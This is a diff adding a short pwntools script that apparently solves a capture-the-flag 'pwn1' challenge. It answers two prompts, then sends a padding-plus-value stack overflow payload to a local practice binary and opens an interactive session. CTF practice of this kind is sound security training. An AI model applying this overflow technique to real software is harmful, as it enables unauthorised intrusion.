@@ -1,0 +1,11 @@
+from pwn import *
+
+p = process("./pwn1")
+
+p.sendlineafter(b"name?\n", b"Sir Lancelot of Camelot")
+p.sendlineafter(b"quest?\n", b"To seek the Holy Grail.")
+
+payload = b"A" * 0x2B + p32(3735097544)
+p.sendlineafter(b"secret?\n", payload)
+
+p.interactive()
